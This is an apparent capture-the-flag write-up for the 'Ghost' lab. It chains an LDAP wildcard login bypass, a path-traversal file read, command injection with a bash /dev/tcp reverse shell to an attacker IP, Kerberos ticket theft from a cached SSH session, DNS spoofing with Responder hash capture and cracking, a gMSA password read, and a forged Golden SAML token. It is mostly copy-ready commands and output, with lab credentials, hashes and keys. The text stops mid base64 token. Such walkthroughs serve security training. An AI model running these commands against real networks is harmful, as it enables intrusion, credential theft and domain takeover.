## Ghost

### Lab Details 

- Difficulty: Insane
- Type: Docker Escape, AD Federation, Golden SAML Attack, AV Evasion, Attack Cross-Domain Trust, Active Directory, Windows

#### Enumeration
- run `nmap`
```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-21 07:46:19Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
443/tcp   open  https?
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ms-sql-ntlm-info: 
|   10.129.231.105:1433: 
|     Target_Name: GHOST
|     NetBIOS_Domain_Name: GHOST
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: ghost.htb
|     DNS_Computer_Name: DC01.ghost.htb
|     DNS_Tree_Name: ghost.htb
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-10-21T07:47:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-21T05:19:24
|_Not valid after:  2055-10-21T05:19:24
| ms-sql-info: 
|   10.129.231.105:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb
| Not valid before: 2024-06-19T15:45:56
|_Not valid after:  2124-06-19T15:55:55
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-21T07:47:50+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC01.ghost.htb
| Not valid before: 2025-10-20T05:16:41
|_Not valid after:  2026-04-21T05:16:41
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8008/tcp  open  http          nginx 1.18.0 (Ubuntu)
|_http-title: Ghost
| http-robots.txt: 5 disallowed entries 
|_/ghost/ /p/ /email/ /r/ /webmentions/receive/
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
8443/tcp  open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=core.ghost.htb
| Subject Alternative Name: DNS:core.ghost.htb
| Not valid before: 2024-06-18T15:14:02
|_Not valid after:  2124-05-25T15:14:02
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| http-title: Ghost Core
|_Requested resource was /login
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52128/tcp open  msrpc         Microsoft Windows RPC
60893/tcp open  msrpc         Microsoft Windows RPC
61041/tcp open  msrpc         Microsoft Windows RPC
```
- found domain 
	- `10.129.231.105 DC01.ghost.htb ghost.htb core.ghost.htb federation.ghost.htb intranet.ghost.htb`   
- port 139/445 `SMB` - Anonymous access not allowed
- port 80 `HTTP` - `Not Found` upon visit
- port 8008 `HTTP` - presented with home
![[ghost at port 8008.png]]
- saw the output from `nmap` robot.txt is not allowing scan at `/ghost/` directory visit `/ghost` directory we get a login page
![[ghost cms.png]]
- attempt to  directories with `ffuf` nothing useful was found
- attempt with `vhost` scan, found `http://intranet.ghost.htb:8008`
![[ghost intranet login.png]]
- port 8443 `HTTPS`- presented with `Ghost Core` web app
![[ghost core.png]]
- click on `login using AD Federation` we get login page to `Ghost Federation`
![[ghost federation.png]]
#### Initial Foothold 
- inspect the login form at `http://intranet.ghost.htb:8008/login`
![[intranet ldap login.png]]
- we see that the login form has `id` of `ldap-username` 
- we can attempt to bypass the login with injection `*` character as login username and password
- we are presented with `/news` endpoint
![[intranet ghost news.png]]

 - on the left side there are 3 tabs
	 - News
		 - mentioned migration from `Gitea` to `Bitbucket` and login info 
	 - User
		 - list of users
	 - Forums
		 - forums 
			 - mentions `bitbucket.ghost.htb` and `gitea.ghost.htb`
			 - `gitea.ghost.htb` exists on port `8008`

```bash
$ python3 get_password.py 
szrr8kpc3z6onlqf
```

![[gitea ghost.png]]
- there are two repos  when signed as `gitea_temp_principal` 
- one is `intranet`
![[gitea ghost intranet repo.png]]
- one is `blog`
![[gitea ghost blog repo.png]]
- from the repos we know that 
	- blogs are hosted with `Ghost CMS` running in a Docker container
	- we are given a key to `Ghost` to access public data `a5af628828958c976a3b6cc81a`
	- an environment variable named `DEV_INTRANET_KEY` are been used to share posts between `intranet` and `Ghost`
	- source code of `Ghost` has been modified such as `posts-public.js` file
- search for `ghost post api` and we get the format to send `api` to target
- to test we can attempt to get posts using the `api` provided `http://gitea.ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a`
![[get posts via api key.png]]
- and we can attempt to perform `LFI` through the `extra` parameter  in `post-public.js` file
```bash
async query(frame) {

const options = {

...frame.options,

mongoTransformer: rejectPrivateFieldsTransformer

};

const posts = await postsService.browsePosts(options);

const extra = frame.original.query?.extra;

if (extra) {

const fs = require("fs");

if (fs.existsSync(extra)) {

const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });

posts.meta.extra = { [extra]: fileContent };

}

}

return posts;

}
```
- testing with `/etc/passwd` with the `extra` parameter and fetched file
![[test lfi using api key.png]]
- attempt to retrieve `/proc/self/environ` file which contains environment variables
```json
"extra":{"../../../../../../../../proc/self/environ":"HOSTNAME=26ae7990f3dd\u0000database__debug=false\u0000YARN_VERSION=1.22.19\u0000PWD=/var/lib/ghost\u0000NODE_ENV=production\u0000database__connection__filename=content/data/ghost.db\u0000HOME=/home/node\u0000database__client=sqlite3\u0000url=http://ghost.htb\u0000DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe\u0000database__useNullAsDefault=true\u0000GHOST_CONTENT=/var/lib/ghost/content\u0000SHLVL=0\u0000GHOST_CLI_VERSION=1.25.3\u0000GHOST_INSTALL=/var/lib/ghost\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000NODE_VERSION=18.19.0\u0000GHOST_VERSION=5.78.0\u0000"
```
- we see the `DEV_INTRANET_KEY` value is `!@yqr!X2kxmQ.@Xe`
- search through `intranet` code base we found file `scan.rs` which contains a function that executes a bash script 
```rust
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {

// currently intranet_url_check is not implemented,

// but the route exists for future compatibility with the blog

let result = Command::new("bash")

.arg("-c")

.arg(format!("intranet_url_check {}", data.url))

.output();

match result {

Ok(output) => {

Json(ScanResponse {

is_safe: true,

temp_command_success: true,

temp_command_stdout: String::from_utf8(output.stdout).unwrap_or("".to_string()),

temp_command_stderr: String::from_utf8(output.stderr).unwrap_or("".to_string()),

})

}

Err(_) => Json(ScanResponse {

is_safe: true,

temp_command_success: false,

temp_command_stdout: "".to_string(),

temp_command_stderr: "".to_string(),

})

}

}
```
- we can attempt to escape from the script to run bash commands 
```bash
$ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY:!@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; whoami"}'

{"is_safe":true,"temp_command_success":true,"temp_command_stdout":"root\n","temp_command_stderr":"bash: line 1: intranet_url_check: command not found\n"}
```
- we get positive response back from `whoami` command results is `root`
- we can then attempt to get reverse shell
```bash
$ curl -X POST http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY:!@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; bash -i >& /dev/tcp/10.10.16.56/4444 0>&1"}'
```
- we get reverse shell back as `root`
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.56] from (UNKNOWN) [10.129.231.105] 49864
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@36b733906694:/app# whoami
whoami
root
```
- we can confirm that the current shell process is running in a docker container since `/.dockerenv` file can be found
```bash
root@36b733906694:/app# ls -la /
ls -la /
total 80
drwxr-xr-x   1 root root 4096 Jul 22  2024 .
drwxr-xr-x   1 root root 4096 Jul 22  2024 ..
-rwxr-xr-x   1 root root    0 Jul 22  2024 .dockerenv
<SNIP>
```
- check running processes, found a ssh session running as `florence.ramirez`
```bash
root@36b733906694:/app# ps aux
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2  84844  4680 ?        Ssl  02:20   0:00 /app/ghost_intranet
root          16  0.0  0.0      0     0 ?        Zs   02:21   0:00 [ssh] <defunct>
root          17  0.0  0.1  11188  3540 ?        Ss   02:21   0:00 ssh: /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 [mux]
root         592  0.0  0.1   3924  2788 ?        S    03:45   0:00 bash -c intranet_url_check ; bash -i >& /dev/tcp/10.10.16.56/4444 0>&1
root         594  0.0  0.1   4188  3372 ?        S    03:45   0:00 bash -i
root         629 25.0  0.1   8100  3948 ?        R    03:49   0:00 ps aux
```
- `/.ssh/controlmaster` is a directory that cashes `ssh` sessions for Active Directory 
- which we can use the cached session to authenticate to the `dev-workstation`
```bash
root@36b733906694:~/.ssh/controlmaster# ls -la
total 12
drwxr-xr-x 1 root root 4096 Oct 22 02:21 .
drwxr-xr-x 1 root root 4096 Jul  5  2024 ..
srw------- 1 root root    0 Oct 22 02:21 florence.ramirez@ghost.htb@dev-workstation:22
```
- from the machine we can then get the `Kerberos` ticket
```bash
ssh florence.ramirez@ghost.htb@dev-workstation "cat /tmp/krb5cc_50 | base64 -w 0; echo"

<@dev-workstation "cat /tmp/krb5cc_50 | base64 -w 0;
> echo"
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
```
- we can use this ticket to authenticate as `forence.ramirez`
```bash
$ echo "BQQADAABAAgAAAAAAAAAAAAAAAEAAAABAAAACUdIT1NULkhUQgAAABBmbG9yZW5jZS5yYW1pcmV6AAAAAQAAAAEAAAAJR0hPU1QuSFRCAAAAEGZsb3JlbmNlLnJhbWlyZXoAAAABAAAAAwAAAAxYLUNBQ0hFQ09ORjoAAAAVa3JiNV9jY2FjaGVfY29uZl9kYXRhAAAAB3BhX3R5cGUAAAA<SNIP>" | base64 -d > f.ccache
```
- export the ticket
```bash
$ export KRB5CCNAME=./f.ccache
```
- now we can work with the AD of target network
- going back to the forum page on `intranet.ghost.htb` 
- a user attempted to visit `bitbucket.ghost.htb` however it was not alive we can attempt to add  a new DNS entry as `bitbucket.ghost.htb` and attempt to capture any requests 
```bash
$ bloodyAD.py -d ghost.htb -k --host DC01.ghost.htb add dnsRecord bitbucket 10.10.16.56
```
- check if record has been added 
```
$ bloodyAD -d ghost.htb -k --host DC01.ghost.htb get dnsDump 


zoneName: ghost.htb

recordName: bitbucket.ghost.htb
A: 10.10.16.56
<snip>
```
- after getting the record we get hash of user `justin.bradley` back from `responder`
```bash
$ sudo responder -I tun0
[HTTP] NTLMv2 Client   : 10.129.231.105
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:2c637e1a9d73e315:90C4F4A0D8B119F1836D4E8B6815C7A9:01010000000000002D6AB5DA4443DC01E2EB22EFDFA1C03C0000000002000800310059005300420001001E00570049004E002D00450048004E004B00530044004A0044005900350055000400140031005900530042002E004C004F00430041004C0003003400570049004E002D00450048004E004B00530044004A0044005900350055002E0031005900530042002E004C004F00430041004C000500140031005900530042002E004C004F00430041004C000800300030000000000000000000000000400000B205B1927F4FD61C7869B12AE1BB977E6426996AE8F5EBF2DC394708E21DB49A0A001000000000000000000000000000000000000900300048005400540050002F006200690074006200750063006B00650074002E00670068006F00730074002E006800740062000000000000000000 
```
- we can then attempt to crack the hash using `hashcat`
```bash
hashcat -m 5600 j.hash /usr/share/wordlists/rockyou.txt
Qwertyuiop1234$$
```
- we get `winrm` access via `evil-winrm` as `justin.bradley`
```bash
$ evil-winrm -i 10.129.231.105 -u justin.bradley -p 'Qwertyuiop1234$$'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\justin.bradley\Documents>
```
#### Lateral Movement (If any)
- Click on `First Degree Object Control` in `bloodhound` while on user `Justin.Bradley`
![[bloodhound readgmsapassword.png]]
- we can see that we have `ReadGMSAPassword` privilege over `ADFS_GMSA$`
- attempt to read `GMSA` password using `nxc`
```bash
$ nxc ldap ghost.htb -u justin.bradley -p 'c' --gmsa
SMB         10.129.231.105  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.231.105  636    DC01             [+] ghost.htb\justin.bradley:Qwertyuiop1234$$ 
LDAPS       10.129.231.105  636    DC01             [*] Getting GMSA Passwords
LDAPS       10.129.231.105  636    DC01             Account: adfs_gmsa$           NTLM: 062cd948e9ffcd0ae84ad388724cc80a
```
- remember that `federation.ghost.htb` mentions login using `AD Federation`
- attempt to login as `justin` but we get `page only availabe to Admin` message
- since we have compromised the `ADFS` service account, we can perform a [Golden SAML Attack](https://www.netwrix.com/golden_saml_attack.html)
- first we need to load [ADFSDump](https://github.com/mandiant/ADFSDump) to target via `evil-winrm` using `ADFS_GMSA$` account
- run it and we will get the private key and signing key 
```bash
.\ADFSDump.exe
## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-
13-A3-C6-2C-58-A6-F4-58-FB-9D-A1
## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
AAAAAQAAAAAEEAFyHlNXh2<SNIP>IJe26lpgqpYz1vZa15VKuCRU6v62HtqsOnB5sn6IhR16z3H416uFm
Xc9k4WRZQ0zrZjdFm+WPAHoWAufzAdZP/pdYv1IsrDoXsIAyAgw3rEzcwKs6XA5K9kihMIZXXEvtU2rsN
GevNCjFqNMAS9BeNi9r/XjHDXnFZv6OQpfYJUPiUmumE+DYXZ/AP/MPSDrCkLKVPyip7xDevBN/BEsNEU
STXxm
<SNIP>
```
- then we need to copy the keys to separate files on to our machine
- Private Key to a file called `DKMKey.txt` and the Encrypted Token Signing Key to a file called `TKSKey.txt`
- the transform to appropriate formats
```bash
cat TKSKey.txt | base64 -d > TKSKey.bin
cat DKMKey.txt | tr -d "-" | xxd -r -p > DKMkey.bin
```
- next we use `ADFSpoof` to generate the ticket
```bash
$ python3 ADFSpoof.py -b ~/TKSKey.bin ~/DKMkey.bin -s 'core.ghost.htb' saml2 --endpoint 'https://core.ghost.htb:8443/adfs/saml/postResponse' --nameidformat 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress' --nameid 'Administrator@ghost.htb' --rpidentifier 'https://core.ghost.htb:8443' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"> <AttributeValue> Administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"> <AttributeValue>Administrator</AttributeValue></Attribute>'
    ___    ____  ___________                   ____
   /   |  / __ \/ ____/ ___/____  ____  ____  / __/
  / /| | / / / / /_   \__ \/ __ \/ __ \/ __ \/ /_  
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / /_/ / __/  
/_/  |_/_____/_/    /____/ .___/\____/\____/_/     
                        /_/                        

A tool to for AD FS security tokens
Created by @doughsec

PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJfSjRRWFY3IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAyNS0xMC0yMlQxMjowMTozMC4wMDBaIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzL2FkZnMvc2FtbC9wb3N0UmVzcG9uc2UiIENvbnNlbnQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpjb25zZW50OnVuc3BlY2lmaWVkIj48SXNzdWVyIHhtbG5zPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIj5odHRwOi8vY29yZS5naG9zdC5odGIvYWRmcy9zZXJ2aWNlcy90cnVzdDwvSXNzdWVyPjxzYW1scDpTdGF0dXM%2BPHNhbWxwOlN0YXR1c0NvZGUgVmFsdWU9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpzdGF0dXM6U3VjY2VzcyIvPjwvc2FtbHA6U3RhdHVzPjxBc3NlcnRpb24geG1sbnM9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfV1BEME9WIiBJc3N1ZUluc3RhbnQ9IjIwMjUtMTAtMjJUMTI6MDE6MzAuMDAwWiIgVmVyc2lvbj0iMi4wIj48SXNzdWVyPmh0dHA6Ly9jb3JlLmdob3N0Lmh0Yi9hZGZzL3NlcnZpY2VzL3RydXN0PC9Jc3N1ZXI%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX1dQRDBPViI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPnExdzZmQnprMVBROUowaERRN1A3MjdabXNSdFBkNlc2SVZIVkRnREJrMkU9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%2BPGRzOlNpZ25hdHVyZVZhbHVlPlQ4RytxS2QzZVhmZGFOREZYQlBSSzVjM0U1YUNyKzQ5cHpyS3krZ1J4RkZ3WlVMRkZhWUN1Q2sxVVVncVJtTFE3dk1IYjZoS3B5MHZCRHJYamxDYjZXQ3lCZHZTVTBlMjNSS2ZIRzlmdVZBRFduYWZQK1N3UHM5WVhaSW5Ib1NHY0FxWDhObVFvNFlPWFpDVmoyelJRYnNLaHdRL1UxTEU1bnBDVnk5RVBnc0p6VzFhTjN2SEtmNXgwNkQ4VkJ5dkNXU2hudW9EWUM4ckIvaGsvYTYva0dDSnBuZnZZZ200alh1ZE1kRGZqSmFTTnJDc1VKZ1drQ2JkbzZucUNZck5WUzBRaWcwSXJDUGVzTUZLZnJTdGRmaDM2dGIxQ1p2a3NWZkVYN3llYWFiYksxK0I3L1J2TXJPaUtqL21hcjd5eFFBSjVRTnd6N2xPaTNsN0o5VHdKM3ZENEMyaDgwajU3bXhiejI0WG9CY3hXMFBEYm1pYVgwUzMrMlJWQ2JqNFRnUFl2M1l5R09aamx2UmVrSldBaUJkN25jcnJsbGQ1cVllWkprNGFCNkxsTXFJWm1WUVMzVnNlbVM3Y0dwdkNtSDJFUzIxZVphOXJZTlN5WUpWSzlkYnFSakhkUmhNVGxZdXlTMWk2ZW5SUkVsa1hlWlVSZ1Fxd09nREpTdTZMc2JzaGF2cGx1UDRvRDRJUThEcElLbm9mSW4wTUN5OWNjOXB0MUJNQjZMKyswQ0NHQXdkKy80MTc2RDhQWmNWdjh6dUt4QTd2L2NPSWVPTi9mbjMrc3NUTUNLNTd1M2J4UkFoSTlRMzRDdVVxMkNhZWV3QTNOOXl0NDAwYzd6QTNXY0VDVGtkUlcxanMvTnRFalZ2QUhQTUtLeG5sUllLOUphMVlmYWZYU01zPTwvZHM6U2lnbmF0dXJlVmFsdWU%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%2BTUlJRTVqQ0NBczZnQXdJQkFnSVFKRmNXd015YlJhNU80K1dPNXRXb0dUQU5CZ2txaGtpRzl3MEJBUXNGQURBdU1Td3dLZ1lEVlFRREV5TkJSRVpUSUZOcFoyNXBibWNnTFNCbVpXUmxjbUYwYVc5dUxtZG9iM04wTG1oMFlqQWdGdzB5TkRBMk1UZ3hOakUzTVRCYUdBOHlNVEEwTURVek1ERTJNVGN4TUZvd0xqRXNNQ29HQTFVRUF4TWpRVVJHVXlCVGFXZHVhVzVuSUMwZ1ptVmtaWEpoZEdsdmJpNW5hRzl6ZEM1b2RHSXdnZ0lpTUEwR0NTcUdTSWIzRFFFQkFRVUFBNElDRHdBd2dnSUtBb0lDQVFDK0FBT0lmRXF0bFljbjE1M0wxQnZHUWdEeVhUbll3VFJ6c0s1OSt6RTF6Z0dLTzlONW5iOEZrK2RhS3BXTFFhaUg3b0RIYWVudy9RYXhCZzVxZGVEWW1EM296OEt5YUExeWdZQnJ6bTR3VzdGZjg3cks5RmU1SjUvaDZXOWc3NDloNUJJcVBRT3AwbDZzMXJmdW1PY2NONHliVzk1RVdOTDB2dVFYdkMrS1E0RDRnTVh1OG1DR3B4dHZJTDhpbE50SnVJRzNPUllTS2hSYWwweXlKZU9oRzR4Z2xyWkpGMThwOXdobkU2b21nZ21BNm4yc2hEay90dlRZamlpNWU3L2ljV1RLa3JzTUNwYUtVTms3bXhkTVpoUWFiN1NtZktyWk40cFJEN2RWZzV6ekl5RDdVelM5Q0hMQzZ4TnpxL1owaHVhT2FKaE9TZEpTZ2F0L2JzRzhuYngxOUhELyt5cFc5SjJMdE5GdWdkV3RtVUJXRE9RQllWaEI4U2c0VkVHZ1A5anlJdEhIMmJ6c0RmalJkSjhFMXVOSldQL2tRQTErd1lsT2RkTHFVM2IwSXNDdmxBOEV2WVcwVDFSc3U3N280eC93MGdXYjBvUVBFSXo3ejk3M2I0OTZ3cVF0M0RueWZlTzNsWFhmWk5jdmFqNUtDUDJUdEdCK0tzaEY5cGtJUHhxN0YyZ01oN1FqeGpSSHNBMjlWOGpGbzlnTEQ3a1BWaWNhSVVkc2dpRkhuWVFGMTRhNTJKdFIxVjVpTitoOTVKa3V1RXFRV0RCSEF2UEVCQlprRVpIKzV5VCthQ0ZYWFgrQnBQdDNRR2pZTGVKVThDRnNNdG44UVZMWXZMZGNWUnNVblJoL1dIaVh3Sk9PRVZFQ2E5dzcveVZuaGFsQ05CeDFFL2w0S1FJREFRQUJNQTBHQ1NxR1NJYjNEUUVCQ3dVQUE0SUNBUUFXWUtaVzNjRENCTzZkVDN5ZmwzT2N1eXAxTFZLVkkrOXBGeC9iYldwV2pTZGg2YjM5TFR4eEQ3RllVdGh1V1BaM3JGNEcrRmRNRkhIQ3gzWXBFbVVGbkVMS3NYcWhaOTg5QVg1OEkvM21iZlVsS1dlSV